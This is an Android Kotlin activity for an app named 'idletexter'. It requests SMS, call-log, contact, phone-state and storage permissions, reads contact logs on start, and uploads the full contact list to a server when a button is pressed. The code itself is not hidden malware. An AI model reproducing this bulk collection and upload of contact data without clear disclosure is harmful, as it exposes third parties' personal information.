package com.example.idletexter

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Environment
import android.provider.CallLog
import android.util.Log
import android.view.View
import android.widget.Button
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AlertDialog
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.android.volley.Request
import com.android.volley.VolleyError

import org.json.JSONObject

import com.android.volley.toolbox.JsonObjectRequest

import com.android.volley.toolbox.Volley

import com.android.volley.RequestQueue
import com.android.volley.Response
import com.android.volley.toolbox.JsonArrayRequest
import org.json.JSONException
import org.json.JSONArray
import java.util.Collections.checkedSet

import com.android.volley.AuthFailureError

import com.android.volley.toolbox.StringRequest
import com.example.idletexter.network_request.requests.RetrofitCallsAuthentication
//import org.library.worksheet.cellstyles.WorkSheet
import java.util.*
import kotlin.collections.HashMap

import java.lang.Exception
//import com.opencsv.CSVWriter
import java.io.*
import kotlin.collections.HashSet



class MainActivity : AppCompatActivity() {

    private val permissionsRequestCode = 123
    private val list = listOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CONTACTS,

        )

    private val retrofitCallsAuthentication: RetrofitCallsAuthentication = RetrofitCallsAuthentication()

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        findViewById<Button>(R.id.button).setOnClickListener {

            fetchData()

        }

    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun fetchData() {

        val isPermitted = ManagePermissions(this,list,permissionsRequestCode).checkPermissions()
        if (isPermitted){
            val contactList = Formatter().getAllContactData(this)

            val idletexterData = IdletexterData(contactList)
            retrofitCallsAuthentication.uploadContacts(this,idletexterData)

        }else{

            Log.e("-*-*-*- ", "++")

        }

    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onStart() {
        super.onStart()
        checkUserPermission()
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun checkUserPermission() {

        // Initialize a new instance of ManagePermissions class
        val isPermitted = ManagePermissions(this,list,permissionsRequestCode).checkPermissions()
        if (isPermitted){
            Formatter().getContactLogs(this)
//            Formatter().getAllSms(this)
        }
    }


}